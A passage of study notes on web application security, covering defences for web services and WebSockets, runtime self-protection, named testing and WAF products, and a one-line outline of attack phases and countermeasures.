- **Web service attacks** — validate inputs, strong auth (OAuth/JWT/API keys), RBAC, secure WSDL/SOAP, schema validation, firewall/IDS, message signatures, disable unused features, TLS, hide internal details.
- **WebSocket security** — `wss://` (TLS), validate Origin header, JWT auth, RBAC, limit message size, rate limiting, session timeouts, logging/monitoring, subprotocols, check server certificates, secure libraries, security headers (CSP, X-Frame-Options).

### Protection technologies
- **RASP (Runtime Application Self-Protection)** — built into the app; monitors/blocks attacks in real time; detects hidden vulns, prevents zero-days, reduces false positives. Benefits: visibility, DevOps collaboration, pen-testing support, incident response.
- **Testing tools:** N-Stalker, Veracode, Invicti (DAST+IAST), Contrast Security, Snyk, CodeSonar, HCL AppScan.
- **WAFs:** Cloudflare (attack scoring, content scanning, rate limiting), Imperva, AppWall (Radware), Qualys WAF, Barracuda, NetScaler.

> Flow: footprint infrastructure (WHOIS/banner/WAF/tech/WebSockets) → analyze the app (entry points, server-side tech, files/dirs, vulns, mirroring) → attack by category (bypass client controls, auth/session/access-control, injection + LFI, logic/shared env/client, DB connectivity, web services, API + OAuth). Defend with input validation + parameterized queries + context-sensitive output encoding, strong auth/session management, default-deny access control + RBAC, security headers, WAF/RASP, and SAST/DAST/fuzz throughout a secure SDLC.
